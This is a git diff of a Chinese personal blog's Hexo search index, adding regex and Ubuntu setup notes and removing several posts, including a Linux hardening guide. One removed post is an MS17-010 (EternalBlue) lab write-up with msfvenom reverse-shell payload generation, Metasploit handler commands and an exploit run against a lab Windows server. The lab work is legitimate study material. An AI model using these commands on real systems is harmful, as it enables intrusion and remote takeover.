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 </div>]]></content>
+    <title>正则表达式笔记</title>
+    <url>/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="简介"><a class="header-anchor" href="#简介"></a>简介</h2>
+<blockquote>
+<p>正则表达式是描述一组字符串特征的模式，用来匹配特定的字符串。 ——Ken Thompson</p>
+</blockquote>
+<p>一个正则表达式是一串特殊的字符串，它可以用于匹配一组字符串。比如</p>
+<pre><code>\d
+</code></pre>
+<p>就是一个简单的正则表达式，它可以用来匹配0~9范围内的任意<strong>一个数字</strong>。</p>
+<pre><code>^(\(\d{3}\)|^\d{3}[.-]?)?\d{3}[.-]?\d{4}$
+</code></pre>
+<p>而上面这个式子也是一个正则表达式，只不过复杂了一些，它可以匹配10位的北美电话号码。无论区号是否加括号，数字间是否有句点或连字符，它都可以匹配。</p>
+<p><strong>学习时用到的工具</strong>：</p>
+<p><a href="https://regex101.com/">Regexpal网站</a>：可以在线测试正则表达式</p>
+<p>…</p>
+<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
+<h3 id="字符的匹配"><a class="header-anchor" href="#字符的匹配"></a>字符的匹配</h3>
+<h4 id="字面值匹配"><a class="header-anchor" href="#字面值匹配"></a>字面值匹配</h4>
+<p>最简单的一种，比如一个数字字符串<code>666</code>，可以在目标文本中匹配所有的<code>666</code></p>
+<p><img src="/2020/04/18/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/fN1TQqSlujEPBCy.png" alt></p>
+<h4 id="字符组匹配"><a class="header-anchor" href="#字符组匹配"></a>字符组匹配</h4>
+<p>正则表达式将方括号<code>[]</code>视为特殊的元字符，因此方括号本身不参与匹配，而对括号内容进行匹配。</p>
+<p><code>[0-9]</code>这个正则表达式将会匹配0到9范围内的任意数字。要匹配任意3位数字可以用如下正则表达式</p>
+<pre><code>[0-9][0-9][0-9]
+</code></pre>
+<h4 id="字符组简写式（元字符）"><a class="header-anchor" href="#字符组简写式（元字符）"></a>字符组简写式（元字符）</h4>
+<p>例如：<code>[0-9]</code>可以简写为<code>\d</code>，它们都能匹配0到9之间的任意一个数字。</p>
+<p>空白字符：</p>
+<p><code>\f</code>：换页符</p>
+<p><code>\n</code>：换行符</p>
+<p><code>\r</code>：回车符</p>
+<p><code>\t</code>：制表符（Tab的缩进）</p>
+<p><code>\v</code>：垂直制表符</p>
+<p><code>\s</code>：任意一个空白字符，等价于 [\f\n\r\t\v]</p>
+<p><code>\S</code>：对<code>\s</code>取非，即任意非空字符</p>
+<p>数字元字符：</p>
+<p><code>\d</code>：匹配任意阿拉伯数字</p>
+<p><code>\D</code>：匹配任意非数字字符（如连字符<code>-</code>)</p>
+<p>字母数字元字符：</p>
+<p><code>\w</code>：大小写字母，下划线和数字，等价于[a-zA-Z0-9]</p>
+<p><code>\W</code>：对<code>\w</code>取非</p>
+<h4 id="任意字符的匹配"><a class="header-anchor" href="#任意字符的匹配"></a>任意字符的匹配</h4>
+<p><code>.</code>：点号（英文句号）可以匹配任意字符（但一般不匹配换行符）。</p>
+<p><code>.</code>是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上<code> \</code> 。</p>
+<h3 id="捕获分组和后向引用"><a class="header-anchor" href="#捕获分组和后向引用"></a>捕获分组和后向引用</h3>
+<p>将<code>\d</code>放到<code>()</code>中，则<code>\d</code>匹配到一个数字的同时该数字被捕获。捕获之后则可以被后向引用。</p>
+<p><code>\1</code>后向引用被捕获的字符。</p>
+<p>例如：正则表达式 <code>(\d)\d\1</code>  可以匹配 <code>101</code> 或者 <code>212</code> , <code>383</code> 等等,但无法匹配 <code>102</code> 。因为<code>\1</code>引用的是那个被捕获的字符，所以这个正则表达式匹配到的一定是某三个相连数字，其中第一个数字和第三个数字一定是相同的。</p>
+<h3 id="量词"><a class="header-anchor" href="#量词"></a>量词</h3>
+<p><code>\d{3}</code>匹配三个相连数字，这里<code>{3}</code>就是一个量词，花括号中可以有多个数字（用逗号<code>,</code>隔开）比如<code>{3,4}</code>表示3个或者4个；</p>
+<p><code>\d-?</code>匹配一个数字，如果该数字之后跟着一个连字符那么连字符也会被匹配到。这里的<code>?</code>也是一个量词，表示0个或1个；</p>
+<p>同理，其他常用的量词还有</p>
+<p><code>+</code>：表示1个或者多个</p>
+<p><code>*</code>：表示0个或者多个</p>
+<h3 id="括选文字符"><a class="header-anchor" href="#括选文字符"></a>括选文字符</h3>
+<p>现在可以看看下面这个比较健壮的表达式了，就是简介中的那个，它匹配10位的北美电话号码</p>
+<pre><code>^(\(\d{3}\)|^\d{3}[.-]?)?\d{3}[.-]?\d{4}$
+</code></pre>
+<p><code>^</code>匹配行起始位置，即<code>^</code>后面跟着的内容<code>(\(\d{3}\)|^\d{3}[.-]?)</code>必须出现在行首；</p>
+<p><code>\(</code>和<code>\)</code>就是将左右括号转义，让它表示其字面意思，而不是捕获分组的开始结束标志；</p>
+<p><code>|</code>表示或运算，即匹配<code>|</code>两边的内容之一；</p>
+<p><code>[.-]</code>匹配一个可选的点号（这里点号不再匹配任意字符）或连字符；</p>
+<p><code>$</code>匹配行的结束标志</p>
+<p>这个表达式最终匹配十位的北美电话号码，而且括号、连字符或者点号都是可选的。你可以试试不同格式的电话号码，看看它能否匹配。以上正则表达式中的捕获分组并不是必需的。分组是必要的，但是捕获不需要。更好的方法是使用非捕获分组。</p>
+<h2 id="模式匹配"><a class="header-anchor" href="#模式匹配"></a>模式匹配</h2>
+<p>留坑待填</p>
+]]></content>
       <categories>
-        <category>杂记</category>
+        <category>工具</category>
+        <category>正则表达式</category>
       </categories>
+      <tags>
+        <tag>正则表达式</tag>
+      </tags>
   </entry>
   <entry>
-    <title>漏洞/Java反序列化漏洞</title>
-    <url>/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="序列化和反序列化操作"><a class="header-anchor" href="#序列化和反序列化操作"></a>序列化和反序列化操作</h2>
-<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</p>
-<p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>At the very beginning...</title>
-    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
-    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
-<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
-<p>0.有自己的博客听起来更屌一点。</p>
-<p>1.记录和分享一些学到的东西。</p>
-<p>2.倒逼自己去学一些新东西。</p>
-<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
-<p>信息安全菜鸡</p>
-<p>偶尔打打ctf找虐</p>
-<p>业余爱好拳击，徒步</p>
-<p>QQ：MTc1NTkzNjEyOQ</p>
-<p>欢迎交流 ~</p>
+    <title>Ubuntu (20.04)虚拟机安装配置</title>
+    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
+<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
+<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
+<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
+<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
+<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
+<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
 ]]></content>
       <categories>
-        <category>杂记</category>
+        <category>环境配置</category>
       </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>环境配置</tag>
+      </tags>
   </entry>
   <entry>
     <title>hexo博客搭建</title>
@@ -776,77 +1655,8 @@ echo &quot;export GOPROXY=https://goproxy.io,direct&quot; &gt;&gt; ~/.zshrc &amp
         <category>环境配置</category>
       </categories>
       <tags>
+        <tag>环境配置</tag>
         <tag>hexo</tag>
-        <tag>环境配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MS17-010漏洞复现</title>
-    <url>/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
-<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
-<p>攻击机：Kali Linux	(192.168.233.128)</p>
-<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
-<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
-<p>关闭靶机防火墙</p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
-<p>在window server 2012中启动Guest账号</p>
-<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
-<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
-<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
-<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
-<p>下载到kali后后使用NASM工具对asm代码编译</p>
-<pre><code>nasm -f bin eternalblue_kshellcode_x64.asm
-</code></pre>
-<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
-<pre><code>msfvenom -p windows/x64/shell/reverse_tcp -f raw -o reverse_shell.bin EXITFUNC=thread LHOST=192.168.233.128 LPORT=9090
-</code></pre>
-<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
-<pre><code>cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin
-</code></pre>
-<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
-<pre><code>use exploit/multi/handler
-set PAYLOAD windows/x64/shell/reverse_tcp
-set LHOST 192.168.233.128
-set LPORT 9090
-exploit
-</code></pre>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
-<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
-<p>保存退出，然后运行该脚本</p>
-<pre><code>python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500
-</code></pre>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
-<p>运行成功，此时返回msf命令行</p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
-<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Ubuntu (20.04)虚拟机安装配置</title>
-    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
-<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
-<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
-<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
-<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
-<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
-<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
-        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1239,332 +2049,68 @@ iface eth0 inet dhcp
         <category>环境配置</category>
       </categories>
       <tags>
-        <tag>环境配置</tag>
         <tag>linux</tag>
+        <tag>环境配置</tag>
         <tag>kali</tag>
         <tag>SSH</tag>
       </tags>
   </entry>
   <entry>
-    <title>Linux系统加固</title>
-    <url>/2021/03/07/%E8%BF%90%E7%BB%B4/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
-    <content><![CDATA[<h2 id="账号安全"><a class="header-anchor" href="#账号安全"></a>账号安全</h2>
-<p><strong>账号相关文件</strong></p>
-<pre><code class="language-bash">/etc/passwd    -- 记录了系统中各用户的一些基本属性，root可写，所有用户可读
-/etc/shadow    -- 记录了所有用户的密码
-/etc/group     -- 记录了用户组属性
-
-1、检查是否存在除root之外UID为0的用户：
-awk -F ':' '($3==0){print $1}' /etc/passwd
-
-2、查询可以远程登录的帐号信息
-awk '/\$1|\$6/{print $1}' /etc/shadow
-
-3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
-more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
-
-4、禁用或删除多余及可疑的帐号
-usermod -L user    #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头
-userdel -r user    #将删除user用户，并且将/home目录下的user目录一并删除
-</code></pre>
-<p><strong>修改密码策略</strong></p>
-<p>vim /etc/login.defs</p>
-<pre><code>PASS_MAX_DAYS      90               密码最长有效期
-PASS_MIN_DAYS      10               密码修改之间最小的天数
-PASS_MIN_LEN       8                密码长度
-PASS_WARN_AGE      7                口令失效前多少天开始通知用户修改密码
-</code></pre>
-<p><strong>设置密码强度</strong></p>
-<p>vim  /etc/pam.d/common-password</p>
-<p>将原本的</p>
-<pre><code>password requisite  pam_cracklib.so
-</code></pre>
-<p>修改为至少包含一个数字、一个小写字母、一个大写字母、一个特殊字符、且密码长度&gt;=8:</p>
-<pre><code>password requisite  pam_cracklib.so try_first_pass retry=3 dcredit=-1 lcredit=-1 ucredit=-1 ocredit=-1 minlen=8  
-</code></pre>
-<p><strong>限制用户登陆</strong></p>
-<p>vim  /etc/hosts.deny，若禁止192.168.0.1对服务器进行ssh的登陆，添加如下内容</p>
-<pre><code>sshd : 192.168.0.1  
-</code></pre>
-<p><strong>限制登陆次数</strong></p>
-<p>应对暴力破解，我们可以限制登陆次数为5，超过5次登陆失败就锁定**。**vim /etc/pam.d/sshd，在 #%PAM-1.0 的下面，加入下面的内容，表示当密码输入错误达到3次，就锁定用户150秒，如果root用户输入密码错误达到3次，锁定300秒。</p>
-<pre><code>auth required pam_tally2.so deny=3 unlock_time=150 even_deny_root root_unlock_time300
-</code></pre>
-<p>锁定用户的管理：</p>
-<pre><code>pam_tally2                             查看被锁定的用户
-
-pam_tally2  --reset  -u  username      将被锁定的用户解锁
-</code></pre>
-<h2 id="目录-文件权限"><a class="header-anchor" href="#目录-文件权限"></a>目录&amp;文件权限</h2>
-<p><strong>存储用户信息的文件</strong></p>
-<p>在用户登陆中非常重要的三个文件</p>
-<p>/etc/passwd 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
-<p>/etc/shadow 只有root可读 –r-------- 权限值为400</p>
-<p>/etc/group 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
-<pre><code>chmod 644 /etc/passwd
-chmod 400 /etc/shadow
-chmod 644 /etc/group
-</code></pre>
-<p><strong>文件缺省权限设置</strong></p>
-<pre><code class="language-bash">cp /etc/profile /etc/profile.bak
-vim   /etc/profile
-#添加以下内容
-umask 022	#umask与文件创建后的默认所有权限异或结果即为初始权限
-			#root创建的文件默认所有权限为666，666~022=644 (root可读可写，其他用户只可读)
-
-#执行/etc/profile中的shell命令，直接执行umask命令设置的话重启失效
-source  /etc/profile
-</code></pre>
-<h2 id="应用安全设置"><a class="header-anchor" href="#应用安全设置"></a>应用安全设置</h2>
-<p><strong>FTP</strong></p>
-<p>禁止匿名FTP</p>
-<p>vim  /etc/vsftpd/vsftpd.conf</p>
-<pre><code>anonymous_enable=NO    #如果存在anonymous_enable则修改,如果不存在则手动增加
-</code></pre>
-<p><strong>SSH</strong></p>
-<ol>
-<li>在sshd_config禁止root访问和使用sshv2来让ssh更加安全</li>
-</ol>
-<p>vim /etc/ssh/sshd_config</p>
-<pre><code>PermitRootLogin    no
-</code></pre>
-<ol start="2">
-<li>设置SSH空闲超时退出时间,可降低未授权用户访问其他用户ssh会话的风险</li>
-</ol>
-<p>编辑/etc/ssh/sshd_config，将ClientAliveInterval 设置为300到900，即5-15分钟，将ClientAliveCountMax设置为0-3之间。</p>
-<pre><code>ClientAliveInterval 600
-ClientAliveCountMax 2
-</code></pre>
-<ol start="3">
-<li>设置较低的Max AuthTrimes参数将降低SSH服务器被暴力攻击成功的风险</li>
-</ol>
-<p>在/etc/ssh/sshd_config中取消MaxAuthTries注释符号#，设置最大密码尝试失败次数3-6，建议为4：</p>
-<pre><code>MaxAuthTries 4
-</code></pre>
-<p><strong>TELNET</strong></p>
-<p>Telnet使用明文传输数据，存在安全隐患，应该避免使用</p>
-<p>执行如下语句，查看telnet服务是否在运行</p>
-<pre><code class="language-bash">netstat -na | grep &quot;:23&quot;
-</code></pre>
-<p>若正在运行则关闭Telnet服务，在/etc/xinetd.d/telnet中进行配置</p>
-<pre><code>disable=yes
-</code></pre>
-<h2 id="网络设置"><a class="header-anchor" href="#网络设置"></a>网络设置</h2>
-<p><strong>IPTABLES</strong></p>
-<p>根据需求合理配置防火墙</p>
-<p>比如将<code>INPUT</code>链默认规则设为<code>DROP</code>，再添加规则将需要开放的端口设置为<code>ACCEPT</code></p>
-<pre><code class="language-bash">#将INPUT链默认规则设置为DROP
-iptables -P INPUT DROP
-
-#按需添加规则使得开放端口能够接收数据包
-#开放SSH
-iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-#开放80端口
-iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-#...
-</code></pre>
-<p><strong>TCP SYN保护机制</strong></p>
-<pre><code class="language-bash">echo“1”&gt;/proc/sys/net/ipv4/tcp_syncookies //默认为1，一般不用设置
-</code></pre>
-<p>表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击</p>
+    <title>漏洞/Java反序列化漏洞</title>
+    <url>/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="序列化和反序列化操作"><a class="header-anchor" href="#序列化和反序列化操作"></a>序列化和反序列化操作</h2>
+<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。</p>
+<p>Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。</p>
 ]]></content>
-      <categories>
-        <category>运维</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>运维</tag>
-      </tags>
   </entry>
   <entry>
-    <title>应急响应&amp;Linux入侵检测</title>
